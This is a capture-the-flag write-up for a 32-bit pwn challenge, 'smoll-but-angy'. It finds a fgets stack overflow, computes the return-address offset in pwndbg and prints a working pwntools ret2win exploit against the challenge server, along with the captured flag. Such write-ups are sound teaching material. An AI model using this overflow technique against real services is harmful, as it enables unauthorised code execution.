# smoll but angy

This one wasted challenge aku tak jawab bro aku buatpe man...

This time we are given a 32-bit binary

```
❯ file smoll-but-angy

smoll-but-angy: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=a7be88bfc79ba168486dd0ed96ac5bb84fadd3ee, for GNU/Linux 3.2.0, not stripped
```

Check for protections:

```
❯ checksec smoll-but-angy

[*] '/home/mfkrypt/bbctf/pwn/angy/smoll-but-angy'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Decompiled `main()`

```c
undefined4 main(void)

{
  char buffer [128];
  
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stderr,(char *)0x0);
  puts("You dare challenge me?");
  fgets(buffer,2048,(FILE *)stdin);
  puts("Very well, show me what you got!");
  return 0;
}
```

We can see an obvious Buffer Overflow here:

```c
fgets(buffer,2048,(FILE *)stdin);
```

Now what's funny here is the clue here lies in the description:

<figure><img src="../../../.gitbook/assets/image (859).png" alt=""><figcaption></figcaption></figure>

tldr: there's a win-like function which is `treasure()` . Mental note to myself:

{% hint style="info" %}
Read the fucking description
{% endhint %}

Decompiled `treasure()`:

```c
void treasure(void)

{
  system("cat flag");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

It prints out the flag for us, so its just a normal ret2win challenge. First need to find the offset using pwndbg

```
You dare challenge me?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Very well, show me what you got!

Program received signal SIGSEGV, Segmentation fault.
0x6261616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────
 EAX  0
 EBX  0x62616168 ('haab')
 ECX  0
 EDX  0x80e9774 (_IO_stdfile_1_lock) ◂— 0
 EDI  2
 ESI  0x80e7ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
 EBP  0x62616169 ('iaab')
 ESP  0xffffce50 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
 EIP  0x6261616a ('jaab')
──────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────
Invalid address 0x6261616a
```

```
pwndbg> cyclic -l jaab
Finding cyclic pattern of 4 bytes: b'jaab' (hex: 0x6a616162)
Found at offset 136
```

Cool, offset is 136. Now we can build the script.

```python
from pwn import *

elf = context.binary = ELF('./smoll-but-angy', checksec=False)
context.log_level = 'info'

io = remote('157.180.92.15', 36049)

offset = 136

win = elf.sym['treasure']

payload = flat(
	b'A' * offset,
	win,
)

io.sendline(payload)
io.interactive()
```

```
❯ python3 script.py

[+] Opening connection to 157.180.92.15 on port 36049: Done
[*] Switching to interactive mode
You dare challenge me?
Very well, show me what you got!
###########################################################################################
###########################################################################################
###########################################################################################

  ____  _               _____ _  ______  ______ _____  _______     _______ _______ ______ 
 |  _ \| |        /\   / ____| |/ /  _ \|  ____|  __ \|  __ \ \   / / ____|__   __|  ____|
 | |_) | |       /  \ | |    | ' /| |_) | |__  | |__) | |__) \ \_/ / |       | |  | |__   
 |  _ <| |      / /\ \| |    |  < |  _ <|  __| |  _  /|  _  / \   /| |       | |  |  __|  
 | |_) | |____ / ____ \ |____| . \| |_) | |____| | \ \| | \ \  | | | |____   | |  | |     
 |____/|______/_/    \_\_____|_|\_\____/|______|_|  \_\_|  \_\ |_|  \_____|  |_|  |_|     
                                                                                          

###########################################################################################
###########################################################################################
###########################################################################################                                                                                         

IM ANGRY BUT WHAT ELSE CAN I SAY? HERE YOU FLAG:
                                                        bbctf{1_L1k3_wh4t_yO0U_90t_93fe215}
###########################################################################################
[*] Got EOF while reading in interactive
$  
```

Flag: `bbctf{1_L1k3_wh4t_yO0U_90t_93fe215}`

How did I fumbled this 🥀
